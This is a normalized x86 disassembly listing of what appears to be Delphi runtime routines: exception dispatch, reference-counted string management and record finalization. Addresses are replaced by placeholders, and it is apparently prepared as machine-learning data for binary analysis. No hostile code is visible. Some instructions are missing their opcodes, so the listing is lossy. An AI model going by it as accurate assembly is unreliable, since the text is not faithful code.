mov edi [ esp + 0x28 ]
call sub_405fd8
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_40368c
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402c14
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_4039ec
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_4036d4
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_403a24
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403fdc
sub_403a4c
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_405fd8
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_403270
call sub_403634
sub_403aa0
call sub_405fd8
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_403270
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_4036fc
jmp edx
sub_403ae8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027f8
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403c48
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403c70
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403cb6
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403cd0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403d16
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403d70
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405d6c
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d94
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405d6c
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403dbc
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403de0
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403e3c
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403e6c
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_401264
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_40122c
push eax
call sub_40124c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_40122c
push eax
call sub_40124c
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403ef8
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403de0
call sub_403e6c
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403c70
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403c48
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_405838
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403e3c
push eax
call sub_40127c
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403fe8
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_402714
pop eax
sub_40400c
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402714
sub_40403c
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_4040ac
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028f0
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402714
sub_404080
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402714
sub_4040ac
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026f4
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_4040d8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_4040ac
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_403fe8
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028f0
sub_404108
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_404128
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call sub_4012dc
pop ebp
retn 0x4
sub_404144
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_403fe8
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_404634
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404108
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_404108
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404634
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_4040d8
jmp r-xdata
sub_4041e0
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4040d8
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_404210
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404144
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404258
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_4040d8
not ecx
sub_404284
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028f0
pop ebx
retn
mov ecx ebx
sub_4042b0
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_40403c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_404634
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_404634
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028f0
pop edi
pop esi
pop ebx
retn
sub_4042f4
test edx edx
je r-xdata
mov edx ecx
jmp sub_40403c
test ecx ecx
je sub_40403c
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_4042b0
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_4040ac
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028f0
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028f0
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_40403c
pop edx
pop eax
jmp sub_4042b0
call sub_40403c
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_404368
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_4040ac
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_404634
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028f0
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_40403c
dec [ edx - 0x8 ]
sub_4043f4
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_4044b4
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_4040ac
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028f0
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_402714
sub_404508
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_403fe8
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_4040d8
jmp r-xdata
pop ebx
retn 0x4
sub_404548
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_4044b4#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028f0
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_404634
mov edi ecx
sub_404590
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_404634
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028f0
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028f0
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_4045ec
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_404634
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_403fe8
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_4040ac
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_402734
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028f0
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_4046e0
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call sub_40131c
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_404704
test edx edx
je sub_4046c8
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_4046c8
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402850
retn
sub_404728
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_4046c8
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_404910
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404128
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_404128
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404910
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_4047b4
jmp r-xdata
sub_4047b4
test ecx ecx
je sub_4046c8
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402850
pop edx
push [ edx ]
mov [ edx ] eax
call sub_40131c
retn
sub_4047d8
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4047b4
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404840
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_4048c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_404834
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_4047b4
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_404910
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_4046b8
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4046a0
mov ebx eax
mov eax [ edi ]
call sub_404834
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028f0
mov eax esi
sub_404954
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404984
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404984
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404984
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404954
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402850
sub_404a18
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404a64
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404a64
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_40400c
jmp r-xdata
call sub_403fe8
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_4046e0
jmp r-xdata
call sub_4046c8
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404a4c
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404a64
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404a18
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_4058a8
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_4051fc
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402850
sub_404b74
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028f0
mov edx [ eax + esi ]
add eax ebx
call sub_40403c
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
